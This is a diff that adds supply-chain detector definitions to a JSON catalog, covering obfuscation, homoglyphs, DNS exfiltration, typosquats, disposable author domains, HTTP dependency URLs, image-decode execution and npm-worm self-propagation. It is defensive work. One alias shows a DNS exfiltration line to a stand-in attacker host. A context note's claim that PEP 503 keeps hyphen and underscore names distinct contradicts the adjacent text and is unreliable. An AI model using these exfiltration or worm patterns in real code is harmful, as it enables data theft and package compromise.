@@ -1124,6 +1124,171 @@
       "chokepoint": "deps.typosquat-candidate — PEP 503 normalization treats '-', '_', and '.' as equivalent, so a PyPI-specific edit-distance/normalization pass is needed alongside the existing Damerau-Levenshtein check to catch confusables that normalize identically on PyPI but are visually/typographically distinct package names",
       "soft_warn_no_corpus": true,
       "notes": "P4c — PyPI name normalization (PEP 503) folds '-', '_', and '.' together, so `python-requests` and `python_requests` resolve to DIFFERENT install targets despite looking like the same package — a confusion npm's typosquat detector (which assumes npm's stricter unique-name registry) doesn't need to handle."
+    },
+    {
+      "class": "obfuscation-decode",
+      "kind": "sink",
+      "id": "js-mangler-signature",
+      "aliases": [
+        "javascript-obfuscator _0x[hex]{4,6} identifier fingerprint",
+        "obfuscator.io mangled identifiers"
+      ],
+      "detectors": [
+        "obf.js-mangler-signature"
+      ],
+      "tests": [
+        "packages/detectors/test/obf-js-mangler.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "count of distinct `_0x[a-f0-9]{4,6}` matches across FileCapabilities.dynamicCode/envAccesses snippets + suspiciousLiterals previews",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:threat-runtime-obfuscation-js-mangling. Fires when ≥3 distinct mangled identifiers appear in a NEW/CHANGED JS-like file in pair.new."
+    },
+    {
+      "class": "obfuscation-decode",
+      "kind": "sink",
+      "id": "unicode-homoglyph-boundary",
+      "aliases": [
+        "Cyrillic-adjacent-ASCII identifier",
+        "Greek omicron in URL",
+        "Cherokee-in-identifier attack (2024 GitHub)",
+        "Mathematical Alphanumeric Symbols in source"
+      ],
+      "detectors": [
+        "obf.unicode-homoglyph-boundary"
+      ],
+      "tests": [
+        "packages/detectors/test/obf-unicode-homoglyph.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "ASCII↔confusable-alphabet-block adjacency in urlLiterals + suspiciousLiterals previews + dynamicCode/envAccesses snippets",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:threat-runtime-obfuscation-unicode. Diff-safe: fires when the boundary is NEW to a file that had none before, or in an added-package first-version file."
+    },
+    {
+      "class": "net-egress",
+      "kind": "sink",
+      "id": "dns-templated-hostname",
+      "aliases": [
+        "dns.lookup(`${data}.attacker.com`)",
+        "getaddrinfo with template-literal or concatenated hostname",
+        "Burp Collaborator / interact.sh / oastify / dnslog beacons"
+      ],
+      "detectors": [
+        "net.dns-templated-hostname"
+      ],
+      "tests": [
+        "packages/detectors/test/net-dns-templated-hostname.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "capabilities.networkModules ∋ dns/* AND (char-arithmetic-decoder dynamicCode OR encodedUrls OR env-access snippet containing a DNS callee)",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:threat-network-dns-exfil. Diff-safe: only fires when the DNS module is NEWLY imported in the changed version."
+    },
+    {
+      "class": "typosquat",
+      "kind": "entry-point",
+      "id": "hyphen-permutation",
+      "aliases": [
+        "hyphen-token reorder of top-1000 name",
+        "hyphen-token add/drop of top-1000 name",
+        "router-react vs react-router",
+        "node-express vs express",
+        "axios-http vs axios"
+      ],
+      "detectors": [
+        "typo.hyphen-permutation"
+      ],
+      "tests": [
+        "packages/detectors/test/typo-hyphen-permutation.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "packages/detectors/src/data/top-1000-npm.json (1999-entry snapshot) — hyphen-split token-set match against a top-name corpus",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-LL — port from guarddog:typosquatting (hyphen-permutation branch). Complements deps.typosquat-candidate (Damerau-Levenshtein on the full name) with a token-set matcher: `router-react` is edit-distance ≥ 6 from `react-router` (DL misses it), but hyphen-token equal — the shape a distracted developer types."
+    },
+    {
+      "class": "publisher-trust",
+      "kind": "entry-point",
+      "id": "disposable-author-domain",
+      "aliases": [
+        "author.email domain @maildrop.cc",
+        "author.email domain @10minutemail.com",
+        "author.email domain @yopmail.com",
+        "author.email domain on public disposable-domain list"
+      ],
+      "detectors": [
+        "meta.disposable-author-domain"
+      ],
+      "tests": [
+        "packages/detectors/test/meta-disposable-author-domain.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "packages/detectors/src/data/disposable-domains.json (708-entry snapshot) — domain-exact-match against the disposable-email-domains public list",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-LL — port from guarddog:deceptive_author. Complements meta.maintainer-change: the maintainer-change detector fires on the TRANSITION, this one qualifies WHY the new address is suspect."
+    },
+    {
+      "class": "graph-entry-point",
+      "kind": "entry-point",
+      "id": "http-resolved-url",
+      "aliases": [
+        "dependencies: { foo: 'http://…' }",
+        "dependencies: { foo: 'https://non-registry.example/…' }",
+        "plain-http tarball URL as dep spec",
+        "non-registry HTTPS tarball URL as dep spec"
+      ],
+      "detectors": [
+        "manifest-deps.http-resolved-url"
+      ],
+      "tests": [
+        "packages/detectors/test/manifest-deps-http.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "manifest.dependencies / optionalDependencies / peerDependencies value-string check — URL parse + registry-host allowlist",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-LL — port from guarddog:threat-npm-http-dependency. Complements deps.non-registry-source (git+/github:/bitbucket:/gitlab: emitted by engine.ts): this detector fires on the OTHER shape — plain http:// or non-registry https:// URLs as dep specs in package.json itself, not just the lockfile resolved: field."
+    },
+    {
+      "class": "obfuscation-decode",
+      "kind": "sink",
+      "id": "image-decode-exec",
+      "aliases": [
+        "fs.readFileSync('logo.png') → decode → new Function",
+        "PNG/JPG/GIF LSB steganography → runtime unpack",
+        "image asset co-occurring with dynamic-code sink"
+      ],
+      "detectors": [
+        "obf.image-decode-exec"
+      ],
+      "tests": [
+        "packages/detectors/test/obf-image-decode-exec.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "PackageSnapshot.files cross-reference: fsReadTargets pointing at image extensions (.png/.jpg/.gif/.bmp/.webp) + dynamicCode sink (eval/new-function/vm) in the same package",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-LL — port from guarddog:threat-runtime-obfuscation-steganography. Byte-level scanners see a valid image; AST scanners see a fs.readFileSync and a new Function separately. This detector connects the two — image + read + dynamic-code in the SAME snapshot version."
+    },
+    {
+      "class": "install-hook",
+      "kind": "sink",
+      "id": "self-publish-shape",
+      "aliases": [
+        "postinstall + child_process + fs.writeFileSync('package.json')",
+        "npm-worm self-propagation shape",
+        "install-tier hook rewrites manifest and shells out"
+      ],
+      "detectors": [
+        "install.self-publish-shape"
+      ],
+      "tests": [
+        "packages/detectors/test/install-self-publish-shape.test.ts"
+      ],
+      "corpus_refs": [
+        "shai-hulud-2025"
+      ],
+      "chokepoint": "co-occurrence over PackageSnapshot: install-tier lifecycle script + execModules (child_process/worker_threads/vm) + fsWriteTargets containing 'package.json'",
+      "notes": "Wave 8-LL — port from guarddog:threat-runtime-self-propagation. The npm-worm mechanic: install-tier hook that spawns a subprocess AND rewrites the local manifest. Requires all three signals in the SAME diff to keep FP low."
     }
   ]
 }
